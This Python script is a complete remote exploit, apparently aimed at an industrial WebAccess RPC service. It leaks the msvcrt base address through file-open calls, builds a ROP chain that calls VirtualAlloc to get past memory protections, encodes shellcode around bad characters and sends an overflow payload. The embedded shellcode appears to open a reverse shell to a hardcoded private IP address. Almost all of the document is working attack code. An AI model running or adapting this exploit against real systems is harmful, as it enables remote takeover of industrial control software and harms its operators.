import sys, struct
from impacket import uuid
from struct import pack
from impacket.dcerpc.v5 import transport

def call(dce, opcode, stubdata):
	dce.call(opcode, stubdata)
	res = -1
	try:
		res = dce.recv()
	except Exception as e:
		print("Exception encountered..." + str(e))
		sys.exit(1)
	return res

if len(sys.argv) != 3:
	print("Usage : python3 %s [%s] [%s]" % (sys.argv[0], "TargetIP", "filename"))
	print("Provide only host arg")
	sys.exit(1)

port = 4592
interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"
version = "1.0" 

host = sys.argv[1]

def sendBuf(opcode, buf):
	string_binding = "ncacn_ip_tcp:%s" % host
	trans = transport.DCERPCTransportFactory(string_binding)
	trans.set_dport(port)

	print("[+] Connecting to the target")

	dce = trans.get_dce_rpc()
	dce.connect()

	iid = uuid.uuidtup_to_bin((interface, version))
	dce.bind(iid)

	print("[+] Getting a handle to the RPC server")
	stubdata = struct.pack("<I", 0x02)
	res = call(dce, 4, stubdata)
	if res == -1:
		print("[-] Something went wrong")
		sys.exit(1)
	res = struct.unpack("III", res)

	if (len(res) < 3):
		print("[+] Received unexpected length value")
		sys.exit(1)

	print("[+] Sending payload")

#	opcode = 0x2779 #fsopen
	#opcode = 0x278E
	stubdata = struct.pack("<IIII", res[2], opcode, 0x111, 0x222)

	stubdata += buf
	res = call(dce, 1, stubdata)

	dce.disconnect()

	return res
	
	
def check_bad(rop_chain):
	#Change here
	BADCHARS = b"\x00"
	BADCHARS = [bytes([b]) for b in BADCHARS]

	print("[+] Checking bytes...")
	bad_indices = []
	for i in range(len(rop_chain)):
		if rop_chain[i:i+1] in BADCHARS:
			bad_indices.append(i)

	if bad_indices:
		print("[-] ERROR. rop chain has bad chars.")
		for i, byte in enumerate(rop_chain):
			if i in bad_indices:
				print(f"\033[91m{byte:02x}\033[0m", end="")
			else:
				print(f"{byte:02x}", end="")
		print()
		sys.exit()

	print("[+] Rop chain doesn't have bad chars")

BADCHARS = b"\x00\xe0"
replace_str = b"\x01\x0c"
CHARSTOADD = b"\xff"

def add_and_output_bytes():
	result = bytearray()
	for r, c in zip(replace_str, CHARSTOADD):
		sum_value = (r + c) & 0xFF
		result.append(sum_value)

	print("Adding result:")
	for i, byte in enumerate(result):
		print(f"{byte:02X}", end=" ")
		if (i + 1) % 8 == 0:
			print()
	if len(result) % 8 != 0:
		print()

	return bytes(result)

#print Restore Rop chain
def print_bytes_in_groups(byte_string, group_size=4):
	for i in range(0, len(byte_string), group_size):
		group = byte_string[i:i+group_size]
		reversed_group = group[::-1] 
		hex_group = ''.join(f'{b:02X}' for b in reversed_group)
		print(hex_group, end='  ')
		if (i + group_size) % 16 == 0:
			print()
	if len(byte_string) % 16 != 0:
		print()

def mapBadChars(sh):
	i = 0
	badIndex = []
	while i < len(sh):
		for c in BADCHARS:
			if sh[i] == c:
				badIndex.append(i)
		i=i+1
	print("[+] badIndex : " + str(badIndex))
	return badIndex	

def encodeShellcode(data):
	replace_dict = dict(zip(BADCHARS, replace_str))
	replaced_data = bytearray()
	replaced_positions = []

	for i, byte in enumerate(data):
		if byte in replace_dict:
			replaced_data.append(replace_dict[byte])
			replaced_positions.append(i)
		else:
			replaced_data.append(byte)

	print("Encoded shellcode:")
	for i, byte in enumerate(replaced_data):
		if i in replaced_positions:
			sys.stdout.write('\033[91m{:02X}\033[0m'.format(byte)) 
		else:
			sys.stdout.write('{:02X}'.format(byte))
		if (i + 1) % 11 == 0:
			print()
		else:
			sys.stdout.write(' ')
	print()

	return bytes(replaced_data)



def decodeShellcode(badIndex, shellcode):
	#shellcode is not encoded yet.
	restoreRop = b""
	for i in range(len(badIndex)):
		if i == 0:
			offset = badIndex[i]
		else:
			#EAX was added, so you have to sub previous offset
			offset = badIndex[i] - badIndex[i-1]
		
		#This reason is "sub eax, ecx"
		neg_offset = (-offset) & 0xffffffff
		print("[+] neg offset is : " + hex(neg_offset))
		value = 0
		for j in range(len(BADCHARS)):
			if shellcode[badIndex[i]] == BADCHARS[j]:
				value = CHARSTOADD[j]
		
		#ah, bh, ch, dh = value << 8
		value = (value << 8) | 0x49490049

		restoreRop += pack("<L", msvcrtAddr + 0x3d85e) #pop ebx ; ret  ;  (1 found)
		restoreRop += pack("<L", value) #
		restoreRop += pack("<L", msvcrtAddr + 0x0c14d) #pop ecx ; ret  ;  (1 found)
		restoreRop += pack("<L", neg_offset) #
		restoreRop += pack("<L", msvcrtAddr + 0x8acaa) #sub eax, ecx ; ret  ;  (1 found)
		restoreRop += pack("<L", msvcrtAddr + 0x1769e) #xchg eax, ebx ; ret  ;  (1 found)
		restoreRop += pack("<L", msvcrtAddr + 0x46ff4) #add byte [ebx], ah ; ret  ;  (1 found)
		restoreRop += pack("<L", msvcrtAddr + 0x1769e) #xchg eax, ebx ; ret  ;  (1 found)

	print_bytes_in_groups(restoreRop)
	return restoreRop



def create_rop(msvcrtAddr, restoreRop):

	rop_chain = pack("<L", msvcrtAddr + 0x3385c) #xchg eax, ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", msvcrtAddr + 0x318b5) #pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0xfffffeb1) #-14F
	rop_chain += pack("<L", msvcrtAddr + 0x3716d) #add eax, ebp ; ret  ;  (1 found)
#EAX = shellcode address
	rop_chain += restoreRop

#EDI : ret
#ESI : VirtualAlloc address
#EBP: push esp ; ret
#ESP : leave as is
#EBX : dwSize = 0x1
#EDX : flAllocationType = 0x1000
#ECX : flProtect = 0x40
#EAX : 0x90909090

#ESI
	rop_chain += pack("<L", msvcrtAddr + 0x3bbf2) #pop eax ; ret  ;  (1 found)
	rop_chain += pack("<L", msvcrtAddr + 0xb91b8) # VirtualAlloc IAT
	rop_chain += pack("<L", msvcrtAddr + 0x787ac) #mov eax, dword [eax] ; pop esi ; pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x44444444) #JUNK pop esi
	rop_chain += pack("<L", 0x44444444) #JUNK pop ebp
	rop_chain += pack("<L", msvcrtAddr + 0x58b54) #mov edx, eax ; mov eax, ecx ; pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x44444444) #JUNK pop ebp
	rop_chain += pack("<L", msvcrtAddr + 0x3bbf2) #pop eax ; ret  ;  (1 found)
	rop_chain += pack("<L", msvcrtAddr + 0xB3000 + 0x3C01) # Writable Address, .data of msvcrt.dll
	rop_chain += pack("<L", msvcrtAddr + 0x48e5f) #add al, 0xE8 ; mov esi, edx ; add dword [eax], eax ; pop ecx ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x44444444) #JUNK pop ecx
	
#EBX = 0x1
	rop_chain += pack("<L", msvcrtAddr + 0x3bbf2) #pop eax ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x77777779) #
	rop_chain += pack("<L", msvcrtAddr + 0x318b5) #pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x88888888) #
	rop_chain += pack("<L", msvcrtAddr + 0x3716d) #add eax, ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", msvcrtAddr + 0x1769e) #xchg eax, ebx ; ret  ;  (1 found)

#EDX = 0x1000
	rop_chain += pack("<L", msvcrtAddr + 0x3bbf2) #pop eax ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x77778778) #
	rop_chain += pack("<L", msvcrtAddr + 0x318b5) #pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x88888888) #
	rop_chain += pack("<L", msvcrtAddr + 0x3716d) #add eax, ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", msvcrtAddr + 0x58b54) #mov edx, eax ; mov eax, ecx ; pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x44444444) #JUNK pop ebp

#ECX = 0x40
	rop_chain += pack("<L", msvcrtAddr + 0x3bbf2) #pop eax ; ret  ;  (1 found)
	rop_chain += pack("<L", 0xffffffc0) #-0x40
	rop_chain += pack("<L", msvcrtAddr + 0x30b0e) #neg eax ; pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x44444444) #JUNK pop ebp
	rop_chain += pack("<L", msvcrtAddr + 0x808a5) #pop ecx ; mov ecx, eax ; mov eax, ecx ; pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x44444444) #JUNK pop ecx
	rop_chain += pack("<L", 0x44444444) #JUNK pop ebp
	
#EDI
	rop_chain += pack("<L", msvcrtAddr + 0x3b6a7) #pop edi ; ret  ;  (1 found)
	rop_chain += pack("<L", msvcrtAddr + 0x02521) #ret  ;  (1 found)
	
#EBP
	rop_chain += pack("<L", msvcrtAddr + 0x318b5) #pop ebp ; ret  ;  (1 found)
	rop_chain += pack("<L", msvcrtAddr + 0x98928) #push esp ; ret  ;  (1 found)

#EAX
	rop_chain += pack("<L", msvcrtAddr + 0x3bbf2) #pop eax ; ret  ;  (1 found)
	rop_chain += pack("<L", 0x90909090) #

	rop_chain += pack("<L", msvcrtAddr + 0x02e44) #pushad  ; ret  ;  (1 found)
	return rop_chain


filename = sys.argv[2].encode('utf-8')


#----fsopen, fswrite(create file)----
opcode = 0x2738
buf = b"C:\\WebAccess\\Node\\" + filename + b"\x00" #FileName
buf += b"%x" * 10
buf += b"B" * (260 - len(buf)) #MAX size is 260
buf += filename + b"\x00" #fsopen FileName
buf += b"D" * (1000 - len(buf))

res = sendBuf(opcode, buf)




#----fsopen----
opcode = 0x2779 #fsopen
buf = b"C:\\WebAccess\\Node\\" + filename + b"\x00" #FileName
buf += b"A" * (0x104 - len(buf)) #JUNK
buf += b"wb" + b"\x00" #Mode
buf += b"B" * (0x118 - len(buf)) #JUNK
buf += pack("<i", 0x10) #shflag
buf += b"C" * (1000 - len(buf))

res = sendBuf(opcode,buf)
temp = ''.join([res.hex()[i:i+2] for i in range(0, len(res.hex()), 2)][::-1])
if(temp == "00000000"):
	print("[-] Failed open file. Change filename and try again")
	sys.exit()

msvcrtAddr = (int(temp, 16) & 0xFFFFFF00) - 0xb5600
print("[*] Response is : \033[31m0x" + temp + "\033[0m")
print("[*] msvcrt.dll BaseAddress is : \033[31m" + hex(msvcrtAddr) + "\033[0m")

#----fclose----
opcode = 0x277B #fclose

buf = pack("<i", int(temp, 16))
buf += b"C" * (1000 - len(buf))
res = sendBuf(opcode, buf)


#---BOF---
opcode = 0x278E #BOF
offset = 379




#shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x31\xc9\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x2d\xd9\x66\xb8\x05\x3d\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\xb1\x80\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"
shellcode = b"\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x75\xef\x8b\x6a\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c\x01\xe9\x8b\x41\x58\x01\xe8\x8b\x71\x3c\x01\xee\x03\x69\x0c\x53\x6a\x01\x6a\x02\xff\xd0\x97\x68\xc0\xa8\x31\x36\x68\x02\x00\xad\x9d\x89\xe1\x53\xb7\x0c\x53\x51\x57\x51\x6a\x10\x51\x57\x56\xff\xe5"
badIndex = mapBadChars(shellcode)
restoreRop = decodeShellcode(badIndex, shellcode)
shellcode = encodeShellcode(shellcode)

rop_chain = create_rop(msvcrtAddr, restoreRop)
check_bad(rop_chain)

va = pack('<L', msvcrtAddr + 0xb91b8)    # VirtualAlloc IAT
va += pack('<L', 0x45454545)    # Return address = shellcode address
va += pack('<L', 0x46464646)    # lpAddress = Return Address = shellcode Address
va += pack('<i', 0x47474747)    # dwSize
va += pack('<i', 0x48484848)    # flAllocationType, 0x1000
va += pack('<i', 0x49494949)    # flProtect, 0x40

buf = b"A" * (offset - len(va))
buf += va
buf += rop_chain #EIP
#buf += b"BBBB"
buf += b"\x90" * (1000 - len(buf))
buf += shellcode
buf += b"C" * 1000
res = sendBuf(opcode, buf)


print("[+] Done")


